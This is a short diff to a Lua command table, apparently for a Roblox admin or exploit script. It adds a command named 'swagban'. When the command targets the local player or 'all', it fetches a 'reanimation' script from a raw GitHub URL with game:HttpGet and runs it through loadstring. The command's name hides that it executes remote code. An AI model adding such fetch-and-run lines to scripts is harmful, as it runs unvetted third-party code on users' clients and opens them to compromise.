@@ -133,6 +133,14 @@ end
           end
       end;
       ["Clearence"] = {[4] = true;[5] = true;};
+      }; 
+  ["swagban"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/kuragalol/r15/main/reanimation'))()
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
       
   }; 
   
